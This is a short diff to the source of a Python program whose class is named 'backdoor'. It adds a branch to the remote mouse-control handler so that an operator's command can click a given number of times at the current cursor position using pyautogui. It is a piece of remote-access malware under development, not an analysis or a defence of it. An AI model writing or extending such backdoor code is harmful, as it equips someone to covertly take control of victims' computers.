@@ -169,6 +169,10 @@ class backdoor:
                             for i in range(mouse_command_args[2]):
                                 pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                             continue
+                        elif len(mouse_command_args) == 1:
+                            for i in range(mouse_command_args[0]):
+                                pyautogui.click()
+                            continue
                         else:
                             output += "Invalid amounts of arguments. Only 3 arguments needed, [x,y,amount_of_times_to_click]\n"
                     else:
